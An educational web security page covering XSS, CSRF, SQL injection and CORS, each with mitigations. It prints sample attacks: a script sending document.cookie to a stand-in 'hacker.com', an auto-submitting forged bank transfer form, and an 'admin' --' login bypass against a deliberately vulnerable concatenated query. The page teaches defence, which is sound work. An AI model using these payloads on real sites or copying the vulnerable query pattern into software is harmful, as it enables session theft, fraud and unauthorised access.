---
title: Web Security (OWASP)
order: 5
---

Securing a modern web application requires understanding the attack vectors malicious actors use to exploit your system. The **OWASP (Open Worldwide Application Security Project)** Top 10 is the industry standard document for web application security.

Here are the most critical web vulnerabilities that every software engineer must know how to mitigate.

## 1. Cross-Site Scripting (XSS)

XSS occurs when an application includes untrusted, malicious JavaScript data in a web page without proper validation or escaping. 

### The Attack
Imagine a blog comment section that allows users to post HTML. A hacker posts the following comment:
```html
Great article! 
<script>
  fetch('https://hacker.com/steal?cookie=' + document.cookie);
</script>
```
If the backend saves this to the database, and the frontend renders it directly to the DOM for all other users to see, the malicious JavaScript will execute in *every single reader's browser*, instantly stealing their session cookies and sending them to the hacker.

### The Mitigation
*   **Sanitization & Escaping:** Never trust user input. Convert `<script>` tags into safe HTML entities (`&lt;script&gt;`) before rendering. Modern frontend frameworks like React do this automatically by default (unless you explicitly use `dangerouslySetInnerHTML`).
*   **HttpOnly Cookies:** Always set your session/authentication cookies to `HttpOnly`. This prevents any JavaScript (including malicious XSS scripts) from reading the cookie using `document.cookie`.

## 2. Cross-Site Request Forgery (CSRF)

CSRF forces an end user to execute unwanted actions on a web application in which they are currently authenticated.

### The Attack
1.  You log into your banking website (`bank.com`). The bank sets a session cookie in your browser.
2.  Without logging out, you visit a completely different, malicious website (`evil.com`).
3.  `evil.com` has a hidden form on their page:
    ```html
    <form action="https://bank.com/transfer" method="POST">
      <input type="hidden" name="to_account" value="hacker123">
      <input type="hidden" name="amount" value="10000">
    </form>
    <script>document.forms[0].submit();</script>
    ```
4.  Because your browser automatically attaches your `bank.com` session cookies to any request going to `bank.com` (even if it originated from `evil.com`), the bank thinks *you* authorized the transfer!

### The Mitigation
*   **SameSite Cookies:** Set your session cookies to `SameSite=Lax` or `SameSite=Strict`. This instructs the browser to *never* attach the cookie to cross-origin POST requests.
*   **Anti-CSRF Tokens:** The server generates a unique, hidden token injected into the frontend HTML. When the frontend submits a form, it includes the token. `evil.com` cannot read this token, so its forged requests will be rejected by the server.

## 3. SQL Injection (SQLi)

SQL Injection occurs when untrusted user data is concatenated directly into a database query string.

### The Attack
You have a login form. The backend takes the username and password and builds a raw SQL query:
```javascript
const query = `SELECT * FROM users WHERE username = '${req.body.username}' AND password = '${req.body.password}'`;
db.execute(query);
```
The hacker inputs the following as their username: `admin' --`.
The resulting SQL query becomes:
```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = '...'
```
The `--` comments out the rest of the query (the password check)! The hacker instantly logs in as the admin without knowing the password.

### The Mitigation
*   **Prepared Statements (Parameterized Queries):** Never concatenate strings to build SQL. Always use the built-in parameterization provided by your database driver or ORM.
    ```javascript
    // SAFE: The database engine treats the input strictly as a string literal, not executable code.
    db.execute('SELECT * FROM users WHERE username = ? AND password = ?', [username, password]);
    ```

## 4. CORS (Cross-Origin Resource Sharing)

CORS is not a vulnerability; it is a security mechanism enforced by the **web browser** to protect users.

By default, the Same-Origin Policy dictates that a script loaded on `https://my-app.com` cannot make an AJAX/Fetch request to `https://api.other-domain.com`. The browser will block it.

To allow this, the backend API (`other-domain.com`) must explicitly tell the browser that `my-app.com` is allowed to access it.

### The Mechanism
1.  **The Preflight Request:** Before sending a `POST` or `PUT` request, the browser automatically sends an HTTP `OPTIONS` request to the backend. "Hey, is `my-app.com` allowed to send a POST request here?"
2.  **The Server Response:** The backend responds with specific headers:
    `Access-Control-Allow-Origin: https://my-app.com`
    `Access-Control-Allow-Methods: POST, GET, OPTIONS`
3.  **The Actual Request:** If the browser sees the correct headers, it allows the actual `POST` request to proceed.

> [!NOTE]
> CORS is entirely a browser enforcement. If you use a backend tool like `cURL` or Postman to hit the exact same API, CORS does not apply, and the request will succeed.
